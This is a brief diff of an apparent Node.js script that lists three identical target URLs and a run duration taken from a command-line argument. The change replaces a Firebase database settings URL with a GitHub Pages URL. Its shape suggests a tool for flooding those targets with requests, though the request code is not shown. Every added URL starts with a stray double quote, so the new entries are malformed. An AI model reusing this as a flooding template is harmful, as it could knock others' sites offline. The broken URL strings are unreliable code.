@@ -6,9 +6,9 @@ const http = require('http');
 const https = require('https');
 
 const TARGETS = [
-  'https://ur-points-default-rtdb.europe-west1.firebasedatabase.app/BadBoyKick/settings/whatsappUrl.json',
-  'https://ur-points-default-rtdb.europe-west1.firebasedatabase.app/BadBoyKick/settings/whatsappUrl.json',
-  'https://ur-points-default-rtdb.europe-west1.firebasedatabase.app/BadBoyKick/settings/whatsappUrl.json'
+  '"https://attiakhaled663-cloud.github.io/BadBoy-Kick/',
+  '"https://attiakhaled663-cloud.github.io/BadBoy-Kick/',
+  '"https://attiakhaled663-cloud.github.io/BadBoy-Kick/'
 ];
 
 const DURATION = (parseInt(process.argv[2] || '60', 10)) * 1000;
